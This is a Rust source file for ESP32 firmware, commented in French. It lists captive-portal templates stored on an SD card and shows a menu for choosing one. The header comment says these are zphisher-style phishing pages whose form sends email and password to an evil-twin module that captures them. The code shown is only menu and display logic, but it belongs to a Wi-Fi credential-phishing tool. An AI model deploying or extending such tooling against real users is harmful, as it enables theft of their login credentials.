//! Portails captifs servis depuis la carte SD.
//!
//! Chaque portail = un dossier `/sdcard/portals/<site>/` contenant `index.html`
//! (template façon zphisher, dont le `<form>` POST vers `/login` avec les
//! champs `email` / `password`). L'evil-twin ([`super::eviltwin`]) sert le HTML
//! choisi et capture le POST — l'ESP32 ne fait pas tourner de PHP.

use esp_idf_svc::hal::delay::FreeRtos;
use esp_idf_svc::hal::gpio::{Input, PinDriver};
use embedded_graphics::{
    mono_font::{ascii::FONT_6X10, MonoTextStyle},
    pixelcolor::Rgb565,
    prelude::*,
    primitives::{PrimitiveStyleBuilder, Rectangle},
    text::Text,
};

const PORTALS_DIR: &str = "/sdcard/portals";

const BG: Rgb565 = Rgb565::new(1, 4, 2);
const ORANGE: Rgb565 = Rgb565::new(31, 35, 0);
const WHITE: Rgb565 = Rgb565::new(31, 63, 31);
const GRAY: Rgb565 = Rgb565::new(9, 22, 13);

/// Liste les portails disponibles (sous-dossiers de `/sdcard/portals`), triés.
pub fn list() -> Vec<String> {
    let Ok(rd) = std::fs::read_dir(PORTALS_DIR) else {
        return Vec::new();
    };
    let mut v: Vec<String> = rd
        .flatten()
        .filter(|e| e.path().is_dir())
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    v.sort();
    v
}

/// Chemin du template HTML d'un portail.
pub fn html_path(site: &str) -> String {
    format!("{PORTALS_DIR}/{site}/index.html")
}

/// Menu de sélection d'un portail. UP/DOWN naviguent, MID valide, `back` annule.
/// Renvoie le nom du site choisi, ou `None` (annulation / aucun portail sur SD).
pub fn pick<D>(
    display: &mut D,
    btn_up: &PinDriver<'_, Input>,
    btn_dwn: &PinDriver<'_, Input>,
    btn_mid: &PinDriver<'_, Input>,
    back: &PinDriver<'_, Input>,
) -> anyhow::Result<Option<String>>
where
    D: DrawTarget<Color = Rgb565>,
    D::Error: core::fmt::Debug,
{
    let sites = list();
    if sites.is_empty() {
        banner(display, "Aucun portail sur SD", "cf /sdcard/portals/")?;
        while !back.is_low() {
            FreeRtos::delay_ms(50);
        }
        while back.is_low() {
            FreeRtos::delay_ms(10);
        }
        return Ok(None);
    }

    let mut sel = 0usize;
    draw_list(display, &sites, sel)?;
    loop {
        if btn_up.is_low() {
            sel = if sel == 0 { sites.len() - 1 } else { sel - 1 };
            draw_list(display, &sites, sel)?;
            while btn_up.is_low() {
                FreeRtos::delay_ms(10);
            }
        }
        if btn_dwn.is_low() {
            sel = (sel + 1) % sites.len();
            draw_list(display, &sites, sel)?;
            while btn_dwn.is_low() {
                FreeRtos::delay_ms(10);
            }
        }
        if back.is_low() {
            while back.is_low() {
                FreeRtos::delay_ms(10);
            }
            return Ok(None);
        }
        if btn_mid.is_low() {
            while btn_mid.is_low() {
                FreeRtos::delay_ms(10);
            }
            return Ok(Some(sites[sel].clone()));
        }
        FreeRtos::delay_ms(20);
    }
}

fn banner<D>(display: &mut D, l1: &str, l2: &str) -> anyhow::Result<()>
where
    D: DrawTarget<Color = Rgb565>,
    D::Error: core::fmt::Debug,
{
    display.clear(BG).map_err(|e| anyhow::anyhow!("{:?}", e))?;
    Text::new(l1, Point::new(8, 60), MonoTextStyle::new(&FONT_6X10, WHITE))
        .draw(display)
        .map_err(|e| anyhow::anyhow!("{:?}", e))?;
    Text::new(l2, Point::new(8, 80), MonoTextStyle::new(&FONT_6X10, GRAY))
        .draw(display)
        .map_err(|e| anyhow::anyhow!("{:?}", e))?;
    Ok(())
}

fn draw_list<D>(display: &mut D, sites: &[String], selected: usize) -> anyhow::Result<()>
where
    D: DrawTarget<Color = Rgb565>,
    D::Error: core::fmt::Debug,
{
    const VISIBLE: usize = 8;
    display.clear(BG).map_err(|e| anyhow::anyhow!("{:?}", e))?;
    Rectangle::new(Point::new(0, 0), Size::new(240, 30))
        .into_styled(PrimitiveStyleBuilder::new().fill_color(GRAY).build())
        .draw(display)
        .map_err(|e| anyhow::anyhow!("{:?}", e))?;
    let title = format!("PORTAIL  {}/{}", selected + 1, sites.len());
    Text::new(&title, Point::new(8, 19), MonoTextStyle::new(&FONT_6X10, ORANGE))
        .draw(display)
        .map_err(|e| anyhow::anyhow!("{:?}", e))?;

    let start = selected.saturating_sub(VISIBLE - 1).min(sites.len().saturating_sub(VISIBLE));
    let mut y = 44i32;
    for (i, s) in sites.iter().enumerate().skip(start).take(VISIBLE) {
        let is_sel = i == selected;
        if is_sel {
            Rectangle::new(Point::new(4, y - 10), Size::new(232, 22))
                .into_styled(PrimitiveStyleBuilder::new().fill_color(ORANGE).build())
                .draw(display)
                .map_err(|e| anyhow::anyhow!("{:?}", e))?;
        }
        let fg = if is_sel { BG } else { WHITE };
        let line = format!("{:.24}", s);
        Text::new(&line, Point::new(8, y + 5), MonoTextStyle::new(&FONT_6X10, fg))
            .draw(display)
            .map_err(|e| anyhow::anyhow!("{:?}", e))?;
        y += 24;
    }
    Ok(())
}
